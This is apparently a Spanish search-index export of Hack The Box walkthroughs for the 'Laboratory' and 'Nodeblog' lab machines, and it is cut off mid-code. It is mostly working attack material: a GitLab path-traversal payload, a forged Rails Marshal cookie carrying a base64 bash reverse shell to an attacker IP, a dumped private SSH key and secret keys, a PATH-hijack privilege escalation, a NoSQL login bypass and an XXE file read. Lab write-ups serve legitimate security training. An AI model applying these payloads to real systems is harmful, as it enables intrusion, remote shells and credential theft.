games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false _apt:x:104:65534::/nonexistent:/bin/false sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin git:x:998:998::/var/opt/gitlab:/bin/sh gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh registry:x:993:993::/var/opt/gitlab/registry:/bin/sh gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh Configuraci\u00f3n cr\u00edtica /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml: # This file is managed by gitlab-ctl. Manual changes will be # erased! To change the contents below, edit /etc/gitlab/gitlab.rb # and run `sudo gitlab-ctl reconfigure`. --- production: db_key_base: 627773a77f567a5853a5c6652018f3f6e41d04aa53ed1e0df33c66b04ef0c38b88f402e0e73ba7676e93f1e54e425f74d59528fb35b170a1b9d5ce620bc11838 secret_key_base: 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3 otp_key_base: Con la secret_key_base se pueden ejecutar comandos, antes deplegamos un docker con un entorno similar, y usamos la consola para ejecutar unos comandos para generar un cookie, finalmente se inyectar\u00e1 con curl desde la m\u00e1quina atacante para conseguir una shell reversa: docker pull gitlab/gitlab-ce:12.8.1-ce.0 docker images docker run 719e7e45b1e2 docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES a856a1f20715 719e7e45b1e2 \"/assets/wrapper\" About a minute ago Up About a minute (health: starting) 22/tcp, 80/tcp, 443/tcp mystifying_volhard docker exec -it a856a1f20715 bash # Se modifica la secret_key_base: root@a856a1f20715:/# nano /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml # Se abre el cli de \"gitlab-rails console\" que trae el aplicativo y desde ah\u00ed se genera la cookie con un comando en base 64: root@a856a1f20715:/# gitlab-rails console request = ActionDispatch::Request.new(Rails.application.env_config) request.env[\"action_dispatch.cookies_serializer\"] = :marshal cookies = request.cookie_jar erb = ERB.new(\"<%= `echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTEvNDQzIDA+JjEiCg==|base64 -d|bash` %>\") depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, \"@result\", ActiveSupport::Deprecation.new) cookies.signed[:cookie] = depr puts cookies[:cookie] Explotation - Intrusi\u00f3n en el contenedor y obtencion de la clave privada de Dexter: Se inyecta la cookie con curl: curl -k -vvv 'https://git.laboratory.htb/users/sign_in' -b \"experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiAaUjY29kaW5nOlVURi04Cl9lcmJvdXQgPSArJyc7IF9lcmJvdXQuPDwoKCBgZWNobyBMMkpwYmk5aVlYTm9JQzFqSUNJdlltbHVMMkpoYzJnZ0xXa2dQaVlnTDJSbGRpOTBZM0F2TVRBdU1UQXVNVFF1TVRFdk5EUXpJREErSmpFaUNnPT18YmFzZTY0IC1kfGJhc2hgICkudG9fcyk7IF9lcmJvdXQGOgZFRjoOQGVuY29kaW5nSXU6DUVuY29kaW5nClVURi04BjsKRjoTQGZyb3plbl9zdHJpbmcwOg5AZmlsZW5hbWUwOgxAbGluZW5vaQA6DEBtZXRob2Q6C3Jlc3VsdDoJQHZhckkiDEByZXN1bHQGOwpUOhBAZGVwcmVjYXRvckl1Oh9BY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbgAGOwpU--7c9f76f50df6fc9bc026c91a7dacf4fd9e5ac332\" Y se accece al contenedor y escalamos permisos de nuestro usuario en el aplicativo: git@git:~/gitlab-rails/working$ hostname -I 172.17.0.2 git@git:/home$ gitlab-rails console irb(main):002:0> u = User.find_by_username('pollero') => #<User id:5 @pollero> irb(main):003:0> u.admin => false irb(main):004:0> u.admin=true => true irb(main):006:0> u.save! => true Se accede a la web de gitlab y hay un proyecto nuevo donde se encuentra una sshkey en el perfil de Dexter: -----BEGIN OPENSSH PRIVATE KEY----- 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 -----END OPENSSH PRIVATE KEY----- Se comprueba que la clave es v\u00e1lida y se accede a la m\u00e1quina victima: ssh dexter@laboratory.htb -i id_rsa_dexter dexter@laboratory:~$ whoami dexter dexter@laboratory:~$ cat /home/dexter/user.txt e75404ef8d4c8b2f1af666449742bb7a Escalate Privileges - Path Hickjacking (root) Se encuentra el binario (/usr/local/bin/docker-security) con privilegios de suid, tras hacer un cat se puede intuir un chmod sin ruta absoluta, se decide crear un script que de permisos de suid a /bin/bash para poder escalar: dexter@laboratory:~$ nano chmod dexter@laboratory:~$ chmod +x chmod dexter@laboratory:~$ export PATH=.:$PATH dexter@laboratory:~$ /usr/local/bin/docker-security dexter@laboratory:~$ ls -la /bin/bash -rwsr-xr-x 1 root root 1183448 Jun 18 2020 /bin/bash dexter@laboratory:~$ /bin/bash -p bash-5.0# cat /root/root.txt 64d3d47f8ce565dd75a3435f559c0043","title":"Laboratory"},{"location":"maquinas/linux/laboratory/#laboratory-htb","text":"","title":"Laboratory HTB"},{"location":"maquinas/linux/laboratory/#recon","text":"Se comprueba que la m\u00e1quina est\u00e1 activa: ping 10.10.10.216","title":"Recon"},{"location":"maquinas/linux/laboratory/#enum","text":"Se realiza un scan de los 65535 puertos TCP: nmap -sS -Pn -n --open --min-rate 5000 -p- -vvv -oG allPorts 10.10.10.216 Se realiza un analisis de los puertos abiertos: > nmap -sCV -p22,53,80 10.10.10.216 -oN openPorts Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-08 22:19 CEST Nmap scan report for 10.10.10.216 Host is up (0.12s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 25:ba:64:8f:79:9d:5d:95:97:2c:1b:b2:5e:9b:55:0d (RSA) | 256 28:00:89:05:55:f9:a2:ea:3c:7d:70:ea:4d:ea:60:0f (ECDSA) |_ 256 77:20:ff:e9:46:c0:68:92:1a:0b:21:29:d1:53:aa:87 (ED25519) 80/tcp open http Apache httpd 2.4.41 |_http-title: Did not follow redirect to https://laboratory.htb/ |_http-server-header: Apache/2.4.41 (Ubuntu) 443/tcp open ssl/http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: The Laboratory | ssl-cert: Subject: commonName=laboratory.htb | Subject Alternative Name: DNS:git.laboratory.htb | Not valid before: 2020-07-05T10:39:28 |_Not valid after: 2024-03-03T10:39:28 | tls-alpn: |_ http/1.1 |_http-server-header: Apache/2.4.41 (Ubuntu) |_ssl-date: TLS randomness does not represent time Service Info: Host: laboratory.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel Se revisa el gitlab y su versi\u00f3n correspondiente, hay un art\u00edculo en HackerONE de arbitrary file read: GitLab vuln De este modo con el siguiente payload, si creas dos proyectos y generas un issue moviendolo al otro proyecto, puedes leer archivos de la maquina victima: Payload: ![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd) root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false _apt:x:104:65534::/nonexistent:/bin/false sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin git:x:998:998::/var/opt/gitlab:/bin/sh gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh registry:x:993:993::/var/opt/gitlab/registry:/bin/sh gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh Configuraci\u00f3n cr\u00edtica /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml: # This file is managed by gitlab-ctl. Manual changes will be # erased! To change the contents below, edit /etc/gitlab/gitlab.rb # and run `sudo gitlab-ctl reconfigure`. --- production: db_key_base: 627773a77f567a5853a5c6652018f3f6e41d04aa53ed1e0df33c66b04ef0c38b88f402e0e73ba7676e93f1e54e425f74d59528fb35b170a1b9d5ce620bc11838 secret_key_base: 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3 otp_key_base: Con la secret_key_base se pueden ejecutar comandos, antes deplegamos un docker con un entorno similar, y usamos la consola para ejecutar unos comandos para generar un cookie, finalmente se inyectar\u00e1 con curl desde la m\u00e1quina atacante para conseguir una shell reversa: docker pull gitlab/gitlab-ce:12.8.1-ce.0 docker images docker run 719e7e45b1e2 docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES a856a1f20715 719e7e45b1e2 \"/assets/wrapper\" About a minute ago Up About a minute (health: starting) 22/tcp, 80/tcp, 443/tcp mystifying_volhard docker exec -it a856a1f20715 bash # Se modifica la secret_key_base: root@a856a1f20715:/# nano /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml # Se abre el cli de \"gitlab-rails console\" que trae el aplicativo y desde ah\u00ed se genera la cookie con un comando en base 64: root@a856a1f20715:/# gitlab-rails console request = ActionDispatch::Request.new(Rails.application.env_config) request.env[\"action_dispatch.cookies_serializer\"] = :marshal cookies = request.cookie_jar erb = ERB.new(\"<%= `echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTEvNDQzIDA+JjEiCg==|base64 -d|bash` %>\") depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, \"@result\", ActiveSupport::Deprecation.new) cookies.signed[:cookie] = depr puts cookies[:cookie]","title":"Enum"},{"location":"maquinas/linux/laboratory/#explotation-intrusion-en-el-contenedor-y-obtencion-de-la-clave-privada-de-dexter","text":"Se inyecta la cookie con curl: curl -k -vvv 'https://git.laboratory.htb/users/sign_in' -b \"experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiAaUjY29kaW5nOlVURi04Cl9lcmJvdXQgPSArJyc7IF9lcmJvdXQuPDwoKCBgZWNobyBMMkpwYmk5aVlYTm9JQzFqSUNJdlltbHVMMkpoYzJnZ0xXa2dQaVlnTDJSbGRpOTBZM0F2TVRBdU1UQXVNVFF1TVRFdk5EUXpJREErSmpFaUNnPT18YmFzZTY0IC1kfGJhc2hgICkudG9fcyk7IF9lcmJvdXQGOgZFRjoOQGVuY29kaW5nSXU6DUVuY29kaW5nClVURi04BjsKRjoTQGZyb3plbl9zdHJpbmcwOg5AZmlsZW5hbWUwOgxAbGluZW5vaQA6DEBtZXRob2Q6C3Jlc3VsdDoJQHZhckkiDEByZXN1bHQGOwpUOhBAZGVwcmVjYXRvckl1Oh9BY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbgAGOwpU--7c9f76f50df6fc9bc026c91a7dacf4fd9e5ac332\" Y se accece al contenedor y escalamos permisos de nuestro usuario en el aplicativo: git@git:~/gitlab-rails/working$ hostname -I 172.17.0.2 git@git:/home$ gitlab-rails console irb(main):002:0> u = User.find_by_username('pollero') => #<User id:5 @pollero> irb(main):003:0> u.admin => false irb(main):004:0> u.admin=true => true irb(main):006:0> u.save! => true Se accede a la web de gitlab y hay un proyecto nuevo donde se encuentra una sshkey en el perfil de Dexter: -----BEGIN OPENSSH PRIVATE KEY----- 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 -----END OPENSSH PRIVATE KEY----- Se comprueba que la clave es v\u00e1lida y se accede a la m\u00e1quina victima: ssh dexter@laboratory.htb -i id_rsa_dexter dexter@laboratory:~$ whoami dexter dexter@laboratory:~$ cat /home/dexter/user.txt e75404ef8d4c8b2f1af666449742bb7a","title":"Explotation - Intrusi\u00f3n en el contenedor y obtencion de la clave privada de Dexter:"},{"location":"maquinas/linux/laboratory/#escalate-privileges-path-hickjacking-root","text":"Se encuentra el binario (/usr/local/bin/docker-security) con privilegios de suid, tras hacer un cat se puede intuir un chmod sin ruta absoluta, se decide crear un script que de permisos de suid a /bin/bash para poder escalar: dexter@laboratory:~$ nano chmod dexter@laboratory:~$ chmod +x chmod dexter@laboratory:~$ export PATH=.:$PATH dexter@laboratory:~$ /usr/local/bin/docker-security dexter@laboratory:~$ ls -la /bin/bash -rwsr-xr-x 1 root root 1183448 Jun 18 2020 /bin/bash dexter@laboratory:~$ /bin/bash -p bash-5.0# cat /root/root.txt 64d3d47f8ce565dd75a3435f559c0043","title":"Escalate Privileges - Path Hickjacking (root)"},{"location":"maquinas/linux/nodeblog/","text":"Nodeblog HTB Recon Se comprueba que la m\u00e1quina est\u00e1 activa: ping 10.10.11.139 Enum Se realiza un scan de los 65535 puertos TCP: nmap -sS -Pn -p- -n --open --min-rate 5000 -oG allPorts 10.10.11.139 Se realiza un scan de los puertos abiertos: nmap -sCV -p22,5000 10.10.11.139 -oN openPorts Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-05 14:37 CEST Nmap scan report for 10.10.11.139 Host is up (0.037s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA) | 256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA) |_ 256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519) 5000/tcp open http Node.js (Express middleware) |_http-title: Blog Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel NoSQL - Login bypass Se consigue bypassear el login con la siguiente petici\u00f3n, incluyendo el content type en json y con una inyecci\u00f3n cl\u00e1sica: POST /login HTTP/1.1 Host: 10.10.11.139:5000 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/json Content-Length: 51 Origin: http://10.10.11.139:5000 DNT: 1 Connection: close Referer: http://10.10.11.139:5000/login Upgrade-Insecure-Requests: 1 {\"user\": \"admin\", \"password\": {\"$ne\": \"admin\"}} XXE Injection Tras conseguir la cookie y estar en el aplicativo logeados, existe una nueva funcionalidad que es la de subir archivos usando un pantilla xml, esto se deduce porque al subir otro tipo de archivo diferente nos lo indica el error (visto desde el source): Invalid XML Example: < post >< title > Example Post </ title >< description > Example Description </ description >< markdown > Example Markdown </ markdown ></ post > Modificando la plantilla base, se consigue ver el archivo passwd: > catn xxe.xml <?xml version=\"1.0\"?> <!DOCTYPE markdown [<!ENTITY file SYSTEM 'file:///etc/passwd'> ]> < post > < title > Example Post </ title > < description > Example Description </ description > < markdown > &file; </ markdown > </ post > # fichero /etc/passwd daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:112:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin admin:x:1000:1000:admin:/home/admin:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false mongodb:x:109:117::/var/lib/mongodb:/usr/sbin/nologin Generando errores se puede obtener rutas esenciales, e intuir que siendo un aplicativo node puede tener un fichero (opt/blog/server.js), en el cual se ve que la cookie esta siendo deserializada: const express = require ( 'express' ) const mongoose = require ( 